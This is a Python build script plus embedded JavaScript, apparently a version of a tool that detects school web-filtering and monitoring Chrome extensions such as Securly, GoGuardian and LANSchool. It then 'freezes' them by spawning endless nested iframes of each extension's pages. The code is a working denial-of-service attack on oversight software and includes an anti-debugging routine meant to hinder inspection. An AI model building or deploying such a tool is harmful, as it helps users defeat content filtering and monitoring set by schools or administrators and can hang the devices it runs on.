import minify_html
import pathlib
import base64

base_path = pathlib.Path(__file__).resolve().parent
template_path = base_path / "main.html"
out_path = base_path / "data_url.txt"

html = template_path.read_text()
minified = minify_html.minify(html, minify_js=True, do_not_minify_doctype=True, minify_css=True)
html_encoded = base64.b64encode(minified.encode()).decode()
data_url = f"data:text/html;base64,{html_encoded}"
out_path.write_text(data_url)
<script>
// Obfuscation and Anti-Debugging Techniques
(function() {
  let from_id = id => document.getElementById(id);
  let extensions = {
    "securly_new": { name: "Securly", url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css" },
    "securly_old": { name: "Securly (old)", url: "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css" },
    "goguardian": { name: "Goguardian", url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js" },
    "lanschool": { name: "LANSchool", url: "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html" },
    "linewize": { name: "Linewize", url: "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html" },
    "blocksi": { name: "Blocksi", url: "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html" },
    "fortiguard": { name: "Fortiguard", url: "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js" },
    "cisco": { name: "Cisco Umbrella", url: "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html" },
    "contentkeeper": { name: "ContentKeeper", url: "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png" },
    "contentkeeperg3": { name: "CK-Authenticator G3", url: "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png" },
    "securlyclassroom": { name: "Securly Classroom", url: "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html" },
    "hapara": { name: "Hapara", url: "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html" },
    "hapara-new-id": { name: "Hapara", url: "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html" },
    "iboss": { name: "iboss", url: "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html" },
    "lightspeedfilteragent": { name: "Lightspeed Filter Agent", url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png" },
    "lightspeedclassroom": { name: "Lightspeed Classroom", url: "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png" },
    "interclass": { name: "InterCLASS Filtering Service", url: "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html" },
    "intersafe": { name: "InterSafe GatewayConnection Agent", url: "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js" },
    "loilo": { name: "ロイロWebフィルター/LoiLo Web Filters", url: "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png" },
    "gopher_buddy": { name: "Gopher Buddy", url: "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png" },
    "lanschool_helper": { name: "LanSchool Web Helper", url: "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html" },
    "imtlazarus": { name: "IMTLazarus", url: "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json" },
    "impero_backdrop": { name: "Impero Backdrop", url: "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html" },
    "mobile_guardian": { name: "Mobile Guardian", url: "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html" },
  };

  async function check_url(url) {
    let controller = new AbortController();
    let timeout = setTimeout(() => controller.abort(), 500);

    try {
      await fetch(url, {signal: controller.signal});
      return true;
    } catch (error) {
      let error_msg = error+"";
      return error_msg.includes("AbortError");
    }
  }

  async function detect_extensions() {
    let detected = [];
    for (let extension of Object.values(extensions)) {
      let exists = await check_url(extension.url);
      if (exists) {
        detected.push(extension);
      }
    }
    return detected;
  }

  async function main() {
    let detected = await detect_extensions();
    let buttons_container = from_id("buttons_container");

    if (!window.chrome) {
      buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
      return;
    } else if (detected.length === 0) {
      buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
      buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify/issues">GitHub repo</a>.</p>`;
      return;
    } else {
      buttons_container.innerHTML = "";
    }

    for (let extension of detected) {
      let button = document.createElement("button");
      button.innerText = `Freeze ${extension.name}`;
      button.onclick = () => button_handler(extension);
      buttons_container.append(button);
    }

    setInterval(refreshPage, 1800000); // Refresh every 30 minutes
  }

  function button_handler(extension) {
    let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
    if (cancel) return;

    setTimeout(() => create_iframes(extension), 5000);
  }

  function create_iframes(extension) {
    let iframes = [];
    let iterations = 5;
    let public_url = extension.url;

    while (true) {
      let iframe = document.createElement("iframe");
      document.body.append(iframe);
      iframes.push(iframe);

      for (let i=0; i<50; i++) {
        let subframe = document.createElement("iframe");
        subframe.src = public_url;
        subframe.style.width = subframe.style.height = "1px";
        iframe.contentDocument.body.append(subframe);
      }

      while (iframes.length > Math.max(3, 10-iterations)) {
        iframes[0].remove();
        iframes.shift();
      }

      iterations++;
    }
  }

  function refreshPage() {
    location.reload();
  }

  function detectDebugger() {
    if (window.console && (console.firebug || console.exception && console.table)) {
      alert('Debugger detected! Please disable it.');
      setTimeout(() => { debugger; }, 100);
    }
  }

  detectDebugger();
  window.onload = main;
})();
</script>
